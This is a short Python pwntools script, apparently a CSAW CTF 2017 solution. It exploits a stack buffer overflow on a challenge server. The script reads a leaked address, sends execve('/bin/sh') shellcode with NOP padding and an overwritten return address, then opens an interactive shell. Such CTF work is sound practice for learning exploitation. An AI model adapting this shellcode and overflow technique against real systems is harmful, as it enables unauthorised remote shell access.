#! /usr/bin/env python3
##
# Created for CSAW CTF 2017
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *

# Shellcode
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# DEBUGGING!
#context.log_level = "debug"

# Create tube
t = remote("pwn.chal.csaw.io", 8464)

# Get address
t.recvlines(6)
address = t.recvline()[12:]
packed_address = p64(int(address, 16))

# Prepare padding
padding = b"\x90" * (40 - len(shellcode))

# Prepare payload
payload = shellcode + padding + packed_address

# Send payload
t.sendline(payload)

# Clean and log
t.interactive()

# Close
t.close()
